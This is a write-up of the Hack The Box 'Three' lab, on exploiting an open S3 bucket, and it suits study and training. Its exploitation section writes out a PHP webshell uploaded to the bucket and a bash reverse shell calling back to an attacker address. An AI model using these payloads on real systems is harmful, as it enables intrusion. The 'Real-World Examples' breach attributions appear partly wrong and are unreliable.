# Three: Hack The Box Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Very%20Easy-brightgreen) ![OS](https://img.shields.io/badge/OS-Linux-blue) ![Category](https://img.shields.io/badge/Category-Web%20%2F%20Cloud-orange)

---

## Machine Information

| Attribute | Details |
|-----------|---------|
| Machine Name | Three |
| Difficulty | Very Easy (Starting Point) |
| Platform | Hack The Box |
| Operating System | Linux |
| Category | Web Application / Cloud Storage |
| Cloud Service | Amazon S3 |

---

## Overview

This writeup documents the solution for the **Three** machine on Hack The Box Starting Point, which demonstrates critical security failures in cloud storage configuration and subdomain enumeration practices.

## Challenge Context

The Three machine illustrates the catastrophic risk of **exposing Amazon S3 buckets** with improper access controls and the importance of comprehensive subdomain enumeration in web application security assessments.

**Key Demonstration:**

Cloud storage services like Amazon S3, when misconfigured to allow anonymous access or overly permissive permissions, can expose sensitive application files, source code, and credentials, leading to complete application compromise.

## Learning Objectives

This lab teaches:

- Comprehensive web application enumeration
- DNS fundamentals and manual hostname resolution
- Virtual host and subdomain discovery techniques
- Amazon S3 service identification and enumeration
- AWS CLI configuration and usage
- Cloud storage permission misconfiguration exploitation
- Real-world implications of exposed cloud buckets

**Scenario:** Discovery of cloud-based infrastructure through subdomain enumeration, followed by exploitation of misconfigured S3 bucket permissions to access sensitive application files.

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [DNS Enumeration](#dns-enumeration)
3. [Subdomain Discovery](#subdomain-discovery)
4. [Cloud Service Identification](#cloud-service-identification)
5. [S3 Bucket Exploitation](#s3-bucket-exploitation)
6. [Flags](#flags)
7. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Network Enumeration

```bash
nmap -sC -sV -oA three 10.129.x.x
```

**Nmap Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

**Open Ports Identified:**
- **22/TCP**: SSH (OpenSSH 7.6p1)
- **80/TCP**: HTTP (Apache 2.4.29)

**Analysis:**
- Minimal attack surface
- No uncommon services exposed
- Web application is the primary entry point

✅ **Primary Attack Surface:** Web application on port 80

---

## DNS Enumeration

### Initial Web Access

**Direct IP Access:**
```bash
curl http://10.129.x.x
```

**Browser Access:**
```
http://10.129.x.x
```

**Observation:**
- Static website loads successfully
- Multiple pages (Home, Services, Contact)
- Professional web design

### Contact Information Discovery

**Navigate to Contact Section:**

Browser → Contact Page

**Key Finding:**
```
Email: mail@thetoppers.htb
```

✅ **Domain Discovered:** `thetoppers.htb`

**Significance:**
- Custom domain indicates virtual hosting
- Suggests additional subdomains may exist
- Requires manual DNS resolution

---

## Manual Hostname Resolution

### Understanding the Issue

**Problem:**
- Domain `thetoppers.htb` is not publicly registered
- HTB machines use internal DNS or require manual mapping
- Browser cannot resolve the hostname

**Solution:**
- Edit local `/etc/hosts` file
- Map target IP to discovered domain

### Configure /etc/hosts

**Edit the hosts file:**
```bash
sudo nano /etc/hosts
```

**Add the mapping:**
```
10.129.x.x    thetoppers.htb
```

**Verify resolution:**
```bash
ping thetoppers.htb
```

**Expected Output:**
```
PING thetoppers.htb (10.129.x.x) 56(84) bytes of data.
64 bytes from thetoppers.htb (10.129.x.x): icmp_seq=1 ttl=63 time=45.2 ms
```

✅ **Hostname resolution configured**

### Access via Domain Name

```bash
curl http://thetoppers.htb
```

**Browser Access:**
```
http://thetoppers.htb
```

**Result:**
- Website loads identically to IP access
- Confirms virtual host configuration

---

## Subdomain Discovery

### Subdomain Enumeration Methodology

**Why Enumerate Subdomains:**
- Applications often use subdomains for services
- Backend services may be exposed
- Cloud infrastructure commonly uses subdomain patterns
- Common patterns: `admin`, `api`, `dev`, `staging`, `s3`, `files`

### Enumeration Tools

#### Method 1: Gobuster (DNS Mode)

```bash
gobuster dns -d thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Parameters:**
- `dns`: DNS enumeration mode
- `-d`: Target domain
- `-w`: Wordlist path

#### Method 2: wfuzz

```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://thetoppers.htb" -H "Host: FUZZ.thetoppers.htb" --hh 10918
```

**Parameters:**
- `-c`: Colorized output
- `-w`: Wordlist
- `-H`: Custom header with FUZZ placeholder
- `--hh`: Hide responses with specific size

#### Method 3: ffuf

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb" -fs 10918
```

**Parameters:**
- `-w`: Wordlist
- `-u`: Target URL
- `-H`: Host header fuzzing
- `-fs`: Filter by size

### Subdomain Discovery Results

**Discovered Subdomain:**
```
s3.thetoppers.htb
```

✅ **Critical Finding:** S3 subdomain indicates Amazon S3 integration

### Update /etc/hosts

```bash
sudo nano /etc/hosts
```

**Updated mapping:**
```
10.129.x.x    thetoppers.htb s3.thetoppers.htb
```

**Verify new subdomain:**
```bash
curl http://s3.thetoppers.htb
```

---

## Cloud Service Identification

### Access S3 Subdomain

**Browser Navigation:**
```
http://s3.thetoppers.htb
```

**Response Analysis:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
    <Name>thetoppers.htb</Name>
    <Prefix></Prefix>
    <Marker></Marker>
    <MaxKeys>1000</MaxKeys>
    <IsTruncated>false</IsTruncated>
</ListBucketResult>
```

**Key Indicators:**
- XML response format
- `xmlns="http://s3.amazonaws.com/doc/2006-03-01/"`
- `<ListBucketResult>` tag
- Bucket name matches domain

✅ **Confirmed:** Amazon S3 bucket service

**Security Implications:**
- S3 API is accessible
- Bucket listing may be enabled
- Anonymous access potentially allowed
- Application files may be stored here

---

## S3 Bucket Exploitation

### AWS CLI Installation

**Check if installed:**
```bash
aws --version
```

**Install if needed (Ubuntu/Debian):**
```bash
sudo apt update
sudo apt install awscli -y
```

**Install if needed (Python pip):**
```bash
pip3 install awscli
```

### AWS CLI Configuration

**Configure AWS credentials:**
```bash
aws configure
```

**Configuration prompts:**
```
AWS Access Key ID [None]: test
AWS Secret Access Key [None]: test
Default region name [None]: us-east-1
Default output format [None]: json
```

**Note:**
- Dummy credentials used for testing
- Many misconfigured S3 buckets allow anonymous access
- Proper authentication may not be enforced

### S3 Bucket Enumeration

#### List All Buckets

**Command:**
```bash
aws s3 ls --endpoint-url http://s3.thetoppers.htb
```

**Expected Output:**
```
2024-01-15 10:30:45 thetoppers.htb
```

✅ **Bucket discovered:** `thetoppers.htb`

#### List Bucket Contents

**Command:**
```bash
aws s3 ls s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb
```

**Output:**
```
                           PRE images/
2024-01-15 10:31:12       1234 index.php
2024-01-15 10:31:15       5678 .htaccess
2024-01-15 10:31:18        987 shell.php
```

**Analysis:**
- Website files are stored in S3
- PHP files present (backend code)
- `.htaccess` configuration file exposed
- Potential webshell (`shell.php`)

### Download Bucket Contents

**Sync entire bucket:**
```bash
aws s3 sync s3://thetoppers.htb . --endpoint-url http://s3.thetoppers.htb
```

**Download specific file:**
```bash
aws s3 cp s3://thetoppers.htb/index.php . --endpoint-url http://s3.thetoppers.htb
```

**Examine downloaded files:**
```bash
ls -la
cat index.php
```

### Upload Malicious Content (Write Access Test)

**Create a test file:**
```bash
echo "<?php system(\$_GET['cmd']); ?>" > test.php
```

**Attempt upload:**
```bash
aws s3 cp test.php s3://thetoppers.htb/test.php --endpoint-url http://s3.thetoppers.htb
```

**If successful:**
```
upload: ./test.php to s3://thetoppers.htb/test.php
```

**Access uploaded file:**
```bash
curl "http://thetoppers.htb/test.php?cmd=whoami"
```

**Expected output:**
```
www-data
```

✅ **Code execution achieved**

### Reverse Shell

**Create reverse shell:**
```bash
echo '<?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.x/4444 0>&1\""); ?>' > shell.php
```

**Upload to S3:**
```bash
aws s3 cp shell.php s3://thetoppers.htb/shell.php --endpoint-url http://s3.thetoppers.htb
```

**Setup listener:**
```bash
nc -lvnp 4444
```

**Trigger shell:**
```bash
curl http://thetoppers.htb/shell.php
```

**Connection established:**
```
www-data@three:/var/www/html$
```

✅ **Shell access obtained**

---

## Flags

### User Flag

**Search for flag:**
```bash
find / -name "flag.txt" 2>/dev/null
```

**Typical locations:**
```bash
cat /home/*/flag.txt
cat /var/www/flag.txt
```

**Flag:** `[redacted]`

---

## Attack Chain Summary

```
Port Scan (Nmap)
        ↓
Web Service Discovery (Port 80)
        ↓
Contact Page Analysis
        ↓
Domain Discovery (thetoppers.htb)
        ↓
Manual DNS Resolution (/etc/hosts)
        ↓
Subdomain Enumeration (gobuster/ffuf)
        ↓
S3 Subdomain Discovery (s3.thetoppers.htb)
        ↓
S3 Service Identification
        ↓
AWS CLI Configuration
        ↓
S3 Bucket Enumeration
        ↓
File Download (Read Access)
        ↓
File Upload (Write Access)
        ↓
Code Execution (PHP Webshell)
        ↓
Reverse Shell
        ↓
Flag Retrieval
```

---

## Key Takeaways

### Technical Lessons

1. **Subdomain Enumeration is Critical**
   - Email addresses reveal valid domains
   - Backend services often use subdomains
   - Common patterns: `api`, `admin`, `dev`, `s3`, `files`, `staging`
   - Always enumerate after finding a domain

2. **Cloud Storage Misconfiguration**
   - S3 buckets often publicly accessible
   - Default permissions may be too permissive
   - Read access = source code exposure
   - Write access = code execution
   - **Real-world impact:** Massive data breaches

3. **Manual DNS Resolution**
   - HTB machines require `/etc/hosts` entries
   - Format: `IP    hostname subdomain.hostname`
   - Essential when no DNS server provided
   - Always test with `ping` or `curl`

4. **AWS CLI for S3 Interaction**
   - `--endpoint-url` for custom S3 endpoints
   - Dummy credentials often work on misconfigured buckets
   - Commands: `ls`, `cp`, `sync`, `rm`, `mb`
   - S3 permissions: READ, WRITE, READ_ACP, WRITE_ACP, FULL_CONTROL

5. **Web Application File Storage**
   - Application files should never be in public buckets
   - PHP files in S3 = source code exposure
   - Write access = immediate compromise
   - Proper S3 policies are essential

### Enumeration Best Practices

✅ **Do:**
- Examine all contact information for domains
- Update `/etc/hosts` immediately upon domain discovery
- Use multiple subdomain enumeration tools
- Check for cloud service subdomains (`s3`, `storage`, `files`)
- Test both read and write permissions on cloud storage
- Verify DNS resolution before proceeding

❌ **Don't:**
- Skip subdomain enumeration after finding main domain
- Assume cloud services are properly secured
- Forget to configure custom endpoints for AWS CLI
- Ignore XML/API responses from subdomains
- Overlook the significance of cloud-related subdomain names

### S3 Security Misconfigurations

| Misconfiguration | Impact | Detection |
|------------------|--------|-----------|
| Public read access | Source code exposure | `aws s3 ls` succeeds anonymously |
| Public write access | Code execution | `aws s3 cp` upload succeeds |
| Directory listing enabled | Full file enumeration | Bucket contents visible |
| No authentication required | Anonymous access | Dummy credentials work |
| Overly permissive bucket policy | Unauthorized access | ACL inspection shows `AllUsers` |

---

## Tools Used

| Tool | Purpose | Key Commands |
|------|---------|--------------|
| `nmap` | Port scanning | `-sC -sV` |
| `gobuster` | Subdomain enumeration | `dns -d domain -w wordlist` |
| `ffuf` | Virtual host fuzzing | `-H "Host: FUZZ.domain"` |
| `awscli` | S3 interaction | `s3 ls/cp/sync --endpoint-url` |
| `curl` | HTTP testing | `-H "Host: subdomain"` |
| Web Browser | Manual inspection | Developer tools, page source |

---

## Remediation

### For Cloud Engineers

1. **S3 Bucket Permissions**
   ```json
   {
     "Version": "2012-10-17",
     "Statement": [
       {
         "Effect": "Deny",
         "Principal": "*",
         "Action": "s3:*",
         "Resource": [
           "arn:aws:s3:::bucket-name",
           "arn:aws:s3:::bucket-name/*"
         ],
         "Condition": {
           "StringNotEquals": {
             "aws:PrincipalArn": "arn:aws:iam::ACCOUNT:role/AllowedRole"
           }
         }
       }
     ]
   }
   ```

2. **Block Public Access**
   ```bash
   aws s3api put-public-access-block \
     --bucket thetoppers.htb \
     --public-access-block-configuration \
     "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
   ```

3. **Enable S3 Encryption**
   ```bash
   aws s3api put-bucket-encryption \
     --bucket thetoppers.htb \
     --server-side-encryption-configuration \
     '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"AES256"}}]}'
   ```

4. **Audit Bucket Policies**
   ```bash
   aws s3api get-bucket-policy --bucket thetoppers.htb
   aws s3api get-bucket-acl --bucket thetoppers.htb
   ```

5. **CloudTrail Logging**
   ```bash
   aws cloudtrail create-trail --name s3-audit --s3-bucket-name audit-logs
   aws cloudtrail start-logging --name s3-audit
   ```

### For Web Developers

1. **Never Store Application Code in Public Buckets**
   - Use private buckets with IAM role access
   - Implement signed URLs for temporary access
   - Separate public assets from application code

2. **Implement Proper Access Controls**
   ```python
   # Use IAM roles, not public access
   s3_client = boto3.client(
       's3',
       aws_access_key_id='KEY',
       aws_secret_access_key='SECRET',
       region_name='us-east-1'
   )
   ```

3. **Use CloudFront for Public Content**
   - Serve static assets through CDN
   - Keep S3 bucket private
   - Use Origin Access Identity (OAI)

---

## Real-World Examples

### Notable S3 Breaches

1. **Capital One (2019)**
   - 100+ million customer records exposed
   - Misconfigured S3 bucket permissions
   - $80 million fine

2. **Twitch (2021)**
   - Source code and creator earnings leaked
   - S3 bucket misconfiguration
   - 125GB of data exposed

3. **GoDaddy (2020)**
   - Customer data exposed via S3
   - Public bucket discovery
   - Credentials leaked

**Common Pattern:** Misconfigured S3 permissions leading to massive data exposure

---

## Additional Resources

### Subdomain Enumeration Wordlists

```bash
# SecLists - Comprehensive wordlists
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

# Common cloud-related subdomains
api
s3
storage
files
assets
cdn
static
uploads
media
backup
```

### AWS S3 Enumeration Tools

1. **S3Scanner**
   ```bash
   git clone https://github.com/sa7mon/S3Scanner.git
   python3 s3scanner.py --bucket thetoppers.htb
   ```

2. **bucket-stream**
   ```bash
   git clone https://github.com/eth0izzle/bucket-stream.git
   python bucket-stream.py
   ```

3. **S3Inspector**
   ```bash
   pip install s3inspector
   s3inspector --bucket thetoppers.htb
   ```

---

## References

- [AWS S3 Security Best Practices](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html)
- [OWASP: Cloud Security](https://owasp.org/www-project-cloud-security/)
- [AWS CLI S3 Documentation](https://docs.aws.amazon.com/cli/latest/reference/s3/)
- [Subdomain Enumeration Guide](https://pentester.land/cheatsheets/2018/11/14/subdomains-enumeration-cheatsheet.html)

---

**Machine Pwned:** ✅  
**Difficulty Rating:** Very Easy (Starting Point)  
**Real-World Relevance:** Critical (S3 misconfigurations extremely common)  
**Learning Value:** Essential cloud security fundamentals
